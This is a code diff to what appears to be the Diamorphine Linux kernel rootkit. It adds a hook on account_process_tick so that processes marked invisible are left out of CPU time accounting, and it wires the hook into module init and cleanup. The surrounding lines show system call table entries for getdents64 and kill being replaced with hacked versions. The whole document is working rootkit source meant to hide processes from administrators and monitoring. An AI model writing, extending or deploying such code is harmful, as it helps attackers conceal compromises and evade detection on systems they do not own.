@@ -5,6 +5,7 @@
 #include <linux/slab.h>
 #include <linux/proc_ns.h>
 #include <linux/fdtable.h>
+#include <linux/kernel_stat.h>
 
 #include "diamorphine.h"
 #include "khook/engine.h"
@@ -216,6 +217,15 @@ hacked_kill(const struct pt_regs* pt_regs) {
 	return 0;
 }
 
+KHOOK(account_process_tick);
+
+static void khook_account_process_tick(struct task_struct* tsk, int user) {
+	if (tsk->flags & PF_INVISIBLE) {
+		return;
+	}
+	return KHOOK_ORIGIN(account_process_tick, tsk, user);
+}
+
 static inline void
 write_cr0_forced(unsigned long val)
 {
@@ -260,6 +270,7 @@ diamorphine_init(void)
 	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
+	khook_init();
 	protect_memory();
 
 	return 0;
@@ -274,6 +285,7 @@ diamorphine_cleanup(void)
 	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
 
+	khook_cleanup();
 	protect_memory();
 }
 
